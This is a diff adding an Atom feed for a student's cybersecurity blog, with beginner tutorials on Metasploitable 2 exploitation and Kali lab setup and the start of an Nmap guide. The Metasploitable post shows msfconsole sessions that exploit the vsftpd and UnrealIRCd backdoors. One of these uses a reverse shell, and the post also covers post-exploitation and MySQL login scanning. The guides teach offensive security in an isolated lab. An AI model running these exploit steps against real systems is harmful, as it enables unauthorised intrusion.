@@ -1,0 +1,1683 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/">
+  <title>Aimad Ul Islam — Cybersecurity &amp; Network Security Portfolio</title>
+  <subtitle>Cybersecurity student, SOC enthusiast, and network security learner from Pakistan. BSc Computer Science, Cisco certified.</subtitle>
+  <link href="https://aimadulislam.dpdns.org/feed.xml" rel="self" type="application/atom+xml"/>
+  <link href="https://aimadulislam.dpdns.org/" rel="alternate" type="text/html"/>
+  <updated>2026-07-25T00:00:00.000Z</updated>
+  <id>https://aimadulislam.dpdns.org/</id>
+  <language>en-US</language>
+  <author>
+    <name>Aimad Ul Islam</name>
+    <email>info@aimadulislam.dpdns.org</email>
+    <uri>https://aimadulislam.dpdns.org</uri>
+  </author>
+  
+  <entry>
+    <title>Metasploitable 2: The Ultimate Beginner&#39;s Guide to Exploitation</title>
+    <link href="https://aimadulislam.dpdns.org/posts/metasploitable-complete-guide/"/>
+    <updated>2026-07-25T00:00:00.000Z</updated>
+    <id>https://aimadulislam.dpdns.org/posts/metasploitable-complete-guide/</id>
+    <summary type="html"><![CDATA[Learn how to hack Metasploitable 2 from scratch using Metasploit – exploit vsftpd, UnrealIRCd, and more.]]></summary>
+    <content type="html"><![CDATA[<h2 id="introduction" tabindex="-1">Introduction <a class="direct-link" href="#introduction" aria-hidden="true">#</a></h2>
+<p>Metasploitable 2 is the go‑to target for every beginner penetration tester. It’s a deliberately vulnerable Linux virtual machine packed with multiple exploitable services, making it the perfect environment to learn how to use Metasploit, discover vulnerabilities, and practice your hacking skills – all legally.</p>
+<p>In this guide, I’ll walk you through the entire process: from setting up Metasploitable 2 in VirtualBox to exploiting two of its most famous vulnerabilities – the vsftpd backdoor and the UnrealIRCd backdoor – and then performing post‑exploitation steps. By the end, you’ll have a solid understanding of how Metasploit works and how to use it in real engagements.</p>
+<div class="callout callout-info">
+  <i class="fa-solid fa-circle-info" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">What You’ll Need</div>
+    <div class="callout-body">A Kali Linux VM (or any Linux with Metasploit installed), VirtualBox, and of course, the Metasploitable 2 VM.</div>
+  </div>
+</div>
+<div class="callout callout-warn">
+  <i class="fa-solid fa-triangle-exclamation" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">Ethical Use Only</div>
+    <div class="callout-body">This guide is for educational purposes. You must only exploit systems you own or have explicit written permission to test. Unauthorised hacking is illegal and unethical.</div>
+  </div>
+</div>
+<h2 id="what-is-metasploitable-2" tabindex="-1">What is Metasploitable 2? <a class="direct-link" href="#what-is-metasploitable-2" aria-hidden="true">#</a></h2>
+<p>Metasploitable 2 is an Ubuntu 8.04.2 LTS system intentionally designed with a multitude of security flaws. It includes vulnerable versions of FTP, SSH, Telnet, HTTP, MySQL, and other services. It’s the official target for the Metasploit Project and is used in training courses worldwide.</p>
+<p>Some of the notable vulnerabilities include:</p>
+<ul>
+<li><strong>vsftpd 2.3.4</strong> – contains a backdoor that allows remote command execution (CVE‑2011‑2523).</li>
+<li><strong>UnrealIRCd 3.2.8.1</strong> – contains a backdoor that gives a remote shell (CVE‑2010‑2075).</li>
+<li><strong>Apache 2.2.8</strong> – several known vulnerabilities.</li>
+<li><strong>MySQL 5.0.51a</strong> – default root password.</li>
+<li><strong>Tomcat 5.5</strong> – default credentials on the manager interface.</li>
+</ul>
+<p>We’ll focus on the two backdoors because they are the most straightforward and rewarding to exploit as a beginner.</p>
+<h2 id="setting-up-metasploitable-2" tabindex="-1">Setting Up Metasploitable 2 <a class="direct-link" href="#setting-up-metasploitable-2" aria-hidden="true">#</a></h2>
+<ol>
+<li>Download Metasploitable 2 from <a href="https://sourceforge.net/projects/metasploitable/">SourceForge</a>.</li>
+<li>Extract the ZIP archive. Inside, you’ll find a <code>.vmdk</code> disk file.</li>
+<li>In VirtualBox, create a new VM (Linux, Ubuntu 64‑bit).</li>
+<li>Attach the <code>.vmdk</code> as the hard disk.</li>
+<li>Set network adapter to <strong>Host‑Only</strong> (to keep the lab isolated).</li>
+<li>Start the VM. Default credentials: <code>msfadmin</code> / <code>msfadmin</code>.</li>
+<li>Find its IP address with <code>ifconfig</code> inside the VM.</li>
+</ol>
+<p>Now you have your target ready.</p>
+<h2 id="metasploit-framework-basics" tabindex="-1">Metasploit Framework Basics <a class="direct-link" href="#metasploit-framework-basics" aria-hidden="true">#</a></h2>
+<p>Metasploit is a powerful framework that provides a modular approach to exploitation. It consists of several components:</p>
+<ul>
+<li><strong>Exploits</strong> – code that takes advantage of a vulnerability.</li>
+<li><strong>Payloads</strong> – the code that runs on the target after successful exploitation (e.g., a reverse shell).</li>
+<li><strong>Encoders</strong> – obfuscate payloads to evade antivirus.</li>
+<li><strong>Auxiliary modules</strong> – for reconnaissance, scanning, and other tasks.</li>
+<li><strong>Post‑exploitation modules</strong> – for privilege escalation, persistence, etc.</li>
+</ul>
+<p>You interact with Metasploit via the <code>msfconsole</code> command. To start it:</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Launch msfconsole</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code>sudo msfconsole</code></pre>
+</div>
+Inside the console, you can search for modules, set options, and run exploits. Basic commands you’ll use:
+* `search <keyword>` – find modules.
+* `use <module_path>` – select a module.
+* `show options` – display required and optional settings.
+* `set <option> <value>` – configure an option.
+* `run` or `exploit` – execute the module.
+<h2 id="reconnaissance-gathering-intel" tabindex="-1">Reconnaissance – Gathering Intel <a class="direct-link" href="#reconnaissance-gathering-intel" aria-hidden="true">#</a></h2>
+<p>Before exploiting, you need to know what services are running on the target. Nmap is perfect for this. Fire up a terminal on Kali and run:</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Nmap scan of Metasploitable 2</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code>sudo nmap -sV -p- 192.168.56.102</code></pre>
+</div>
+You’ll see a list of open ports and service versions. Pay attention to port **21** (vsftpd) and port **6667** (UnrealIRCd). Both are vulnerable. Also note port 80 (Apache), 3306 (MySQL), and 8180 (Tomcat).
+<h2 id="exploit-1-vsftpd-2-3-4-backdoor-cve-2011-2523" tabindex="-1">Exploit 1: vsftpd 2.3.4 Backdoor (CVE‑2011‑2523) <a class="direct-link" href="#exploit-1-vsftpd-2-3-4-backdoor-cve-2011-2523" aria-hidden="true">#</a></h2>
+<p>The vsftpd 2.3.4 version has a backdoor that allows an attacker to execute arbitrary commands. The backdoor is triggered by a specific username (ending with <code>:)</code>) that opens a shell on port 6200. Metasploit has a module that automates this.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Exploiting vsftpd backdoor</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code>msf6 > search vsftpd
+<p>msf6 &gt; use exploit/unix/ftp/vsftpd_234_backdoor<br>
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set RHOSTS 192.168.56.102<br>
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set PAYLOAD cmd/unix/interact<br>
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; run</p>
+<p>[<em>] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)<br>
+[</em>] 192.168.56.102:21 - Backdooring...<br>
+[<em>] 192.168.56.102:21 - Backdoor triggered<br>
+[</em>] 192.168.56.102:21 - Command shell session 1 opened<br>
+</code></pre></p>
+</div>
+After `run`, you’ll get a command shell on the target. You can run commands like `whoami`, `id`, `ls`, etc. The shell is not interactive enough, but it’s a proof of concept. For a fully interactive shell, you can use a reverse shell payload.
+<div class="callout callout-success">
+  <i class="fa-solid fa-circle-check" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">You Got a Shell!</div>
+    <div class="callout-body">Congratulations – you just exploited your first service! The backdoor grants you access as the <code>root</code> user (since vsftpd runs as root).</div>
+  </div>
+</div>
+<h2 id="exploit-2-unrealircd-backdoor-cve-2010-2075" tabindex="-1">Exploit 2: UnrealIRCd Backdoor (CVE‑2010‑2075) <a class="direct-link" href="#exploit-2-unrealircd-backdoor-cve-2010-2075" aria-hidden="true">#</a></h2>
+<p>UnrealIRCd 3.2.8.1 contains a backdoor that can be exploited by sending a specific line to the server, causing it to execute arbitrary commands. The Metasploit module for this is <code>exploit/unix/irc/unreal_ircd_3281_backdoor</code>.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Exploiting UnrealIRCd backdoor</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code>msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.102
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.56.101   # your Kali IP
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run
+<p>[<em>] 192.168.56.102:6667 - UnrealIRCd 3.2.8.1 backdoor<br>
+[</em>] 192.168.56.102:6667 - Sending backdoor command...<br>
+[*] Command shell session 2 opened<br>
+</code></pre></p>
+</div>
+This time we used a reverse shell payload (`cmd/unix/reverse`) which establishes a connection back to your Kali machine. After the exploit, you’ll have a shell on the target. Again, you’ll be `root`.
+<div class="callout callout-info">
+  <i class="fa-solid fa-circle-info" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">Payload Choice</div>
+    <div class="callout-body">The <code>cmd/unix/reverse</code> payload opens a reverse shell. You need to set <code>LHOST</code> to your Kali IP. Also, make sure your listener is set up automatically – Metasploit handles it for you.</div>
+  </div>
+</div>
+<h2 id="post-exploitation-and-privilege-escalation" tabindex="-1">Post‑Exploitation &amp; Privilege Escalation <a class="direct-link" href="#post-exploitation-and-privilege-escalation" aria-hidden="true">#</a></h2>
+<p>Since we already have root access, we don’t need privilege escalation. However, in a real engagement, you might not always get root directly. Metasploit has many post‑exploitation modules to gather information, maintain access, and more.<br>
+For example, you can use the <code>post/linux/gather/checkvm</code> module to check if the target is a VM, or <code>post/linux/gather/enum_system</code> to gather system information.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Post‑exploitation example</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code>msf6 > use post/linux/gather/enum_system
+msf6 post(linux/gather/enum_system) > set SESSION 1
+msf6 post(linux/gather/enum_system) > run
+<p>[<em>] Running module against 192.168.56.102<br>
+[</em>] Session 1 is not a Meterpreter session... still gathering<br>
+[+] Info stored in /root/.msf4/loot/...<br>
+</code></pre></p>
+</div>
+You can also upgrade your shell to a **Meterpreter** session, which provides more advanced features like file upload/download, keylogging, and pivoting. Use the `sessions -u <id>` command to upgrade.
+<h2 id="auxiliary-modules-for-further-enumeration" tabindex="-1">Auxiliary Modules for Further Enumeration <a class="direct-link" href="#auxiliary-modules-for-further-enumeration" aria-hidden="true">#</a></h2>
+<p>Metasploit also includes many auxiliary modules for scanning and enumeration. For instance, you can use the <code>auxiliary/scanner/mysql/mysql_login</code> module to brute‑force MySQL credentials (the default root password is blank or <code>root</code>).</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">MySQL login scanner</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code>msf6 > use auxiliary/scanner/mysql/mysql_login
+msf6 auxiliary(scanner/mysql/mysql_login) > set RHOSTS 192.168.56.102
+msf6 auxiliary(scanner/mysql/mysql_login) > run
+<p>[*] 192.168.56.102:3306 - 192.168.56.102:3306 - MySQL - Login successful: 'root':''<br>
+</code></pre></p>
+</div>
+<h2 id="next-steps-and-practice" tabindex="-1">Next Steps &amp; Practice <a class="direct-link" href="#next-steps-and-practice" aria-hidden="true">#</a></h2>
+<p>Now that you’ve exploited two services, here are things you can try next:</p>
+<ul>
+<li><strong>Try the Apache and Tomcat vulnerabilities</strong> – use Metasploit modules like <code>exploit/multi/http/tomcat_mgr_deploy</code> to gain a shell.</li>
+<li><strong>Practice using Meterpreter</strong> – upgrade your sessions and try file downloading, screenshotting, and keylogging.</li>
+<li><strong>Use the <code>search</code> command</strong> to find other modules that target Metasploitable 2.</li>
+<li><strong>Read the Metasploit documentation</strong> and understand how to write your own modules.</li>
+<li><strong>Set up a practice network</strong> with multiple VMs to simulate a real enterprise environment.</li>
+</ul>
+]]></content>
+    <author>
+      <name>Aimad Ul Islam</name>
+    </author>
+    
+      
+    <category term="Cybersecurity"/>
+      
+    <category term="Tutorials"/>
+      
+    <category term="Linux"/>
+      
+    
+    
+    
+    <media:thumbnail url="https://i.postimg.cc/hPyNdGVF/Whats-App-Image-2026-07-05-at-9-35-59-PM.jpg"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Getting Started with Kali Linux: Complete Beginner Setup Guide</title>
+    <link href="https://aimadulislam.dpdns.org/posts/kali-linux-setup-guide/"/>
+    <updated>2026-07-15T00:00:00.000Z</updated>
+    <id>https://aimadulislam.dpdns.org/posts/kali-linux-setup-guide/</id>
+    <summary type="html"><![CDATA[Set up your ethical hacking lab from scratch — VirtualBox, Kali Linux, Metasploitable 2, and DVWA.]]></summary>
+    <content type="html"><![CDATA[<h2 id="introduction" tabindex="-1">Introduction <a class="direct-link" href="#introduction" aria-hidden="true">#</a></h2>
+<p>Before you can hack anything, you need a legal, safe environment to practise in. Kali Linux is the industry-standard penetration testing distribution — it comes pre-loaded with 600+ security tools and is used by professional penetration testers worldwide.</p>
+<div class="callout callout-warn">
+  <i class="fa-solid fa-triangle-exclamation" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">Legal Reminder</div>
+    <div class="callout-body">Every technique in this guide must only be practised on systems you own or have explicit written permission to test. Using these tools against systems without authorisation is a criminal offence in Pakistan, the UK, the USA, and virtually every country.</div>
+  </div>
+</div>
+<h2 id="what-you-need" tabindex="-1">What You Need <a class="direct-link" href="#what-you-need" aria-hidden="true">#</a></h2>
+<p>Before we start, here's what you need on your computer:</p>
+<ul>
+<li><strong>At least 8GB RAM</strong> (16GB recommended for running multiple VMs)</li>
+<li><strong>50GB+ free disk space</strong></li>
+<li><strong>64-bit processor</strong> with virtualisation enabled in BIOS (VT-x or AMD-V)</li>
+<li><strong>Internet connection</strong> for downloads</li>
+</ul>
+<div class="callout callout-info">
+  <i class="fa-solid fa-circle-info" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">Enable Virtualisation in BIOS</div>
+    <div class="callout-body">If VirtualBox gives you errors about 64-bit VMs, restart your PC and enter BIOS (usually F2, F12, or Delete on startup). Find "Virtualisation Technology" or "VT-x" and enable it.</div>
+  </div>
+</div>
+<h2 id="step-1-install-virtualbox" tabindex="-1">Step 1: Install VirtualBox <a class="direct-link" href="#step-1-install-virtualbox" aria-hidden="true">#</a></h2>
+<p>VirtualBox is free software that lets you run multiple operating systems inside your current OS. Download it from the official site — never from random websites.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Download & Install VirtualBox</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># 1. Go to: https://www.virtualbox.org/wiki/Downloads
+# 2. Download for your OS (Windows/macOS/Linux)
+# 3. Run the installer as Administrator
+# 4. Accept all defaults → click Next → Install
+# 5. Restart your computer
+<h1 id="verify-installation-on-linux" tabindex="-1">Verify installation on Linux: <a class="direct-link" href="#verify-installation-on-linux" aria-hidden="true">#</a></h1>
+<p>virtualbox --version</p>
+<h1 id="expected-7-x-x-or-similar" tabindex="-1">Expected: 7.x.x or similar</code></pre> <a class="direct-link" href="#expected-7-x-x-or-similar" aria-hidden="true">#</a></h1>
+</div>
+<h2 id="step-2-install-kali-linux" tabindex="-1">Step 2: Install Kali Linux <a class="direct-link" href="#step-2-install-kali-linux" aria-hidden="true">#</a></h2>
+<p>Instead of installing from an ISO (which takes 45 minutes), download the pre-built VirtualBox image from the official Kali website. This is faster and already configured.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Import Kali Linux VM</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># 1. Go to: https://www.kali.org/get-kali/#kali-virtual-machines
+# 2. Click "VirtualBox" → download .ova file (~4GB)
+# 3. Open VirtualBox → File → Import Appliance
+# 4. Select the .ova file → click Import
+# 5. Wait 5–10 minutes
+<h1 id="first-login" tabindex="-1">First login: <a class="direct-link" href="#first-login" aria-hidden="true">#</a></h1>
+<h1 id="username-kali" tabindex="-1">Username: kali <a class="direct-link" href="#username-kali" aria-hidden="true">#</a></h1>
+<h1 id="password-kali" tabindex="-1">Password: kali <a class="direct-link" href="#password-kali" aria-hidden="true">#</a></h1>
+<h1 id="update-everything-run-in-kali-terminal" tabindex="-1">Update everything (run in Kali terminal): <a class="direct-link" href="#update-everything-run-in-kali-terminal" aria-hidden="true">#</a></h1>
+<p>sudo apt update &amp;&amp; sudo apt upgrade -y</code></pre></p>
+</div>
+<div class="callout callout-success">
+  <i class="fa-solid fa-circle-check" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">Change the Default Password</div>
+    <div class="callout-body">Immediately change the default password: <code>passwd</code> → enter a strong password. The default "kali/kali" is publicly known.</div>
+  </div>
+</div>
+<h2 id="step-3-set-up-metasploitable-2" tabindex="-1">Step 3: Set Up Metasploitable 2 <a class="direct-link" href="#step-3-set-up-metasploitable-2" aria-hidden="true">#</a></h2>
+<p>Metasploitable 2 is a deliberately vulnerable Linux server. It's your first legal target — designed specifically for practising attacks. You own it, so you have full permission.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Download & Configure Metasploitable 2</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># 1. Download from SourceForge:
+#    https://sourceforge.net/projects/metasploitable/
+<h1 id="2-extract-the-zip-file" tabindex="-1">2. Extract the ZIP file <a class="direct-link" href="#2-extract-the-zip-file" aria-hidden="true">#</a></h1>
+<h1 id="3-in-virtualbox-new-linux-ubuntu-64-bit" tabindex="-1">3. In VirtualBox: New → Linux → Ubuntu (64-bit) <a class="direct-link" href="#3-in-virtualbox-new-linux-ubuntu-64-bit" aria-hidden="true">#</a></h1>
+<h1 id="name-metasploitable2" tabindex="-1">Name: Metasploitable2 <a class="direct-link" href="#name-metasploitable2" aria-hidden="true">#</a></h1>
+<h1 id="ram-512mb-its-very-lightweight" tabindex="-1">RAM: 512MB (it's very lightweight) <a class="direct-link" href="#ram-512mb-its-very-lightweight" aria-hidden="true">#</a></h1>
+<h1 id="4-at-storage-step-select-the-vmdk-file-from-extracted-folder" tabindex="-1">4. At storage step: select the .vmdk file from extracted folder <a class="direct-link" href="#4-at-storage-step-select-the-vmdk-file-from-extracted-folder" aria-hidden="true">#</a></h1>
+<h1 id="5-network-settings-network-host-only-adapter" tabindex="-1">5. Network: Settings → Network → Host-Only Adapter <a class="direct-link" href="#5-network-settings-network-host-only-adapter" aria-hidden="true">#</a></h1>
+<h1 id="critical-keeps-attacks-isolated-from-internet" tabindex="-1">(CRITICAL: keeps attacks isolated from internet) <a class="direct-link" href="#critical-keeps-attacks-isolated-from-internet" aria-hidden="true">#</a></h1>
+<h1 id="default-credentials" tabindex="-1">Default credentials: <a class="direct-link" href="#default-credentials" aria-hidden="true">#</a></h1>
+<h1 id="username-msfadmin" tabindex="-1">Username: msfadmin <a class="direct-link" href="#username-msfadmin" aria-hidden="true">#</a></h1>
+<h1 id="password-msfadmin" tabindex="-1">Password: msfadmin <a class="direct-link" href="#password-msfadmin" aria-hidden="true">#</a></h1>
+<h1 id="find-its-ip-address-run-inside-metasploitable" tabindex="-1">Find its IP address (run inside Metasploitable): <a class="direct-link" href="#find-its-ip-address-run-inside-metasploitable" aria-hidden="true">#</a></h1>
+<p>ifconfig</p>
+<h1 id="look-for-inet-addr-192-168-56-xxx" tabindex="-1">Look for inet addr: 192.168.56.xxx</code></pre> <a class="direct-link" href="#look-for-inet-addr-192-168-56-xxx" aria-hidden="true">#</a></h1>
+</div>
+<h2 id="step-4-install-dvwa" tabindex="-1">Step 4: Install DVWA <a class="direct-link" href="#step-4-install-dvwa" aria-hidden="true">#</a></h2>
+<p>DVWA (Damn Vulnerable Web Application) gives you a vulnerable website to practise web hacking — SQL injection, XSS, file upload attacks, and more.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Install DVWA with Docker on Kali</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># In your Kali Linux terminal:
+sudo apt install docker.io -y
+sudo systemctl start docker
+sudo systemctl enable docker
+<h1 id="pull-and-run-dvwa" tabindex="-1">Pull and run DVWA: <a class="direct-link" href="#pull-and-run-dvwa" aria-hidden="true">#</a></h1>
+<p>sudo docker pull vulnerables/web-dvwa<br>
+sudo docker run -d -p 80:80 vulnerables/web-dvwa</p>
+<h1 id="open-firefox-in-kali" tabindex="-1">Open Firefox in Kali: <a class="direct-link" href="#open-firefox-in-kali" aria-hidden="true">#</a></h1>
+<h1 id="go-to-http-localhost-setup-php" tabindex="-1">Go to: <a href="http://localhost/setup.php">http://localhost/setup.php</a> <a class="direct-link" href="#go-to-http-localhost-setup-php" aria-hidden="true">#</a></h1>
+<h1 id="click-create-reset-database" tabindex="-1">Click &quot;Create / Reset Database&quot; <a class="direct-link" href="#click-create-reset-database" aria-hidden="true">#</a></h1>
+<h1 id="login-admin-password" tabindex="-1">Login: admin / password <a class="direct-link" href="#login-admin-password" aria-hidden="true">#</a></h1>
+<h1 id="set-security-level-to-low-for-beginners" tabindex="-1">Set Security Level to &quot;Low&quot; for beginners</code></pre> <a class="direct-link" href="#set-security-level-to-low-for-beginners" aria-hidden="true">#</a></h1>
+</div>
+<h2 id="step-5-configure-network" tabindex="-1">Step 5: Configure Network <a class="direct-link" href="#step-5-configure-network" aria-hidden="true">#</a></h2>
+<p>Host-Only networking is essential. It means your VMs can talk to each other but cannot reach the internet — your attack traffic stays completely contained.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Set up Host-Only network</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># In VirtualBox:
+# File → Host Network Manager → Create
+# Note the range: usually 192.168.56.0/24
+<h1 id="set-both-kali-and-metasploitable-to" tabindex="-1">Set BOTH Kali AND Metasploitable to: <a class="direct-link" href="#set-both-kali-and-metasploitable-to" aria-hidden="true">#</a></h1>
+<h1 id="settings-network-adapter-1-host-only-adapter" tabindex="-1">Settings → Network → Adapter 1 → Host-Only Adapter <a class="direct-link" href="#settings-network-adapter-1-host-only-adapter" aria-hidden="true">#</a></h1>
+<h1 id="after-starting-both-vms" tabindex="-1">After starting both VMs: <a class="direct-link" href="#after-starting-both-vms" aria-hidden="true">#</a></h1>
+<h1 id="in-kali" tabindex="-1">In Kali: <a class="direct-link" href="#in-kali" aria-hidden="true">#</a></h1>
+<p>ip a</p>
+<h1 id="note-your-ip-192-168-56-101-example" tabindex="-1">Note your IP: 192.168.56.101 (example) <a class="direct-link" href="#note-your-ip-192-168-56-101-example" aria-hidden="true">#</a></h1>
+<h1 id="test-connection-from-kali-to-metasploitable" tabindex="-1">Test connection from Kali to Metasploitable: <a class="direct-link" href="#test-connection-from-kali-to-metasploitable" aria-hidden="true">#</a></h1>
+<p>ping 192.168.56.102 -c 4</p>
+<h1 id="expected-4-packets-received-lab-is-working" tabindex="-1">Expected: 4 packets received = lab is working!</code></pre> <a class="direct-link" href="#expected-4-packets-received-lab-is-working" aria-hidden="true">#</a></h1>
+</div>
+<h2 id="step-6-run-your-first-scan" tabindex="-1">Step 6: Run Your First Scan <a class="direct-link" href="#step-6-run-your-first-scan" aria-hidden="true">#</a></h2>
+<p>With your lab working, let's run your first real Nmap scan. This is the starting point of every penetration test.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Your first Nmap scan</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># Basic scan of Metasploitable:
+nmap -sV 192.168.56.102
+<h1 id="expected-output" tabindex="-1">Expected output: <a class="direct-link" href="#expected-output" aria-hidden="true">#</a></h1>
+<h1 id="port-state-service-version" tabindex="-1">PORT     STATE SERVICE     VERSION <a class="direct-link" href="#port-state-service-version" aria-hidden="true">#</a></h1>
+<h1 id="21-tcp-open-ftp-vsftpd-2-3-4-famous-backdoor" tabindex="-1">21/tcp   open  ftp         vsftpd 2.3.4   ← famous backdoor! <a class="direct-link" href="#21-tcp-open-ftp-vsftpd-2-3-4-famous-backdoor" aria-hidden="true">#</a></h1>
+<h1 id="22-tcp-open-ssh-openssh-4-7p1" tabindex="-1">22/tcp   open  ssh         OpenSSH 4.7p1 <a class="direct-link" href="#22-tcp-open-ssh-openssh-4-7p1" aria-hidden="true">#</a></h1>
+<h1 id="23-tcp-open-telnet-linux-telnetd" tabindex="-1">23/tcp   open  telnet      Linux telnetd <a class="direct-link" href="#23-tcp-open-telnet-linux-telnetd" aria-hidden="true">#</a></h1>
+<h1 id="80-tcp-open-http-apache-httpd-2-2-8" tabindex="-1">80/tcp   open  http        Apache httpd 2.2.8 <a class="direct-link" href="#80-tcp-open-http-apache-httpd-2-2-8" aria-hidden="true">#</a></h1>
+<h1 id="3306-tcp-open-mysql-mysql-5-0-51a" tabindex="-1">3306/tcp open  mysql       MySQL 5.0.51a <a class="direct-link" href="#3306-tcp-open-mysql-mysql-5-0-51a" aria-hidden="true">#</a></h1>
+<h1 id="many-more-vulnerable-services" tabindex="-1">... many more vulnerable services <a class="direct-link" href="#many-more-vulnerable-services" aria-hidden="true">#</a></h1>
+<h1 id="full-scan-all-65535-ports" tabindex="-1">Full scan (all 65535 ports): <a class="direct-link" href="#full-scan-all-65535-ports" aria-hidden="true">#</a></h1>
+<p>nmap -sV -sC -O -A -p- 192.168.56.102 --min-rate 5000 -oA my_first_scan</code></pre></p>
+</div>
+<blockquote>
+<p>Congratulations. You just ran your first penetration testing recon scan on a legal target. This is how every professional engagement begins.</p>
+</blockquote>
+<h2 id="next-steps" tabindex="-1">Next Steps <a class="direct-link" href="#next-steps" aria-hidden="true">#</a></h2>
+<p>Now that your lab is running, here's what to do next:</p>
+<ul>
+<li><strong>Read my Nmap Deep Dive</strong> — understand every flag and output format</li>
+<li><strong>Create a TryHackMe account</strong> — guided learning paths from beginner to advanced</li>
+<li><strong>Try the vsftpd backdoor exploit</strong> — your first Metasploit module (look up CVE-2011-2523)</li>
+<li><strong>Practice DVWA</strong> — start with SQL injection on Security Level: Low</li>
+<li><strong>Document everything</strong> — take notes, save screenshots, build your methodology</li>
+</ul>
+<div class="callout callout-info">
+  <i class="fa-solid fa-circle-info" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">Your Lab is Ready</div>
+    <div class="callout-body">You now have a complete, legal ethical hacking lab. VirtualBox + Kali + Metasploitable + DVWA is the exact setup used in professional cybersecurity training courses costing thousands of dollars — and you built it for free.</div>
+  </div>
+</div>
+]]></content>
+    <author>
+      <name>Aimad Ul Islam</name>
+    </author>
+    
+      
+    <category term="Cybersecurity"/>
+      
+    <category term="Linux"/>
+      
+    <category term="Tutorials"/>
+      
+    
+    
+    
+    <media:thumbnail url="https://i.postimg.cc/hPyNdGVF/Whats-App-Image-2026-07-05-at-9-35-59-PM.jpg"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Nmap Deep Dive: From Port Scanning to Full Network Enumeration</title>
+    <link href="https://aimadulislam.dpdns.org/posts/nmap-complete-guide/"/>
+    <updated>2026-07-10T00:00:00.000Z</updated>
+    <id>https://aimadulislam.dpdns.org/posts/nmap-complete-guide/</id>
+    <summary type="html"><![CDATA[Master Nmap — every flag, scan type, NSE script, output format, and professional methodology explained with real examples.]]></summary>
+    <content type="html"><![CDATA[<h2 id="what-is-nmap" tabindex="-1">What is Nmap? <a class="direct-link" href="#what-is-nmap" aria-hidden="true">#</a></h2>
+<p>Nmap (Network Mapper) is the most widely used network scanning tool in the world. It was created by Gordon Lyon (Fyodor) in 1997 and has been actively developed ever since. Every penetration tester, network administrator, and security researcher uses it — and for good reason.</p>
+<p>Nmap does several things that are essential to security work:</p>
+<ul>
+<li>Discovers <strong>which hosts are alive</strong> on a network</li>
+<li>Finds <strong>which ports are open</strong> on those hosts</li>
+<li>Detects <strong>what services and versions</strong> are running</li>
+<li>Identifies the <strong>operating system</strong> of the target</li>
+<li>Runs <strong>automated scripts</strong> to detect vulnerabilities and misconfigurations</li>
+</ul>
+<div class="callout callout-warn">
+  <i class="fa-solid fa-triangle-exclamation" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">Authorisation Required</div>
+    <div class="callout-body">Only scan systems you own or have <strong>explicit written permission</strong> to test. Scanning someone else's network without permission is illegal in most countries. All examples in this guide use Metasploitable 2 — a deliberately vulnerable VM you own.</div>
+  </div>
+</div>
+<h2 id="installing-nmap" tabindex="-1">Installing Nmap <a class="direct-link" href="#installing-nmap" aria-hidden="true">#</a></h2>
+<p>Nmap comes pre-installed on Kali Linux. If you're on another system, here's how to install it:</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Installation</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
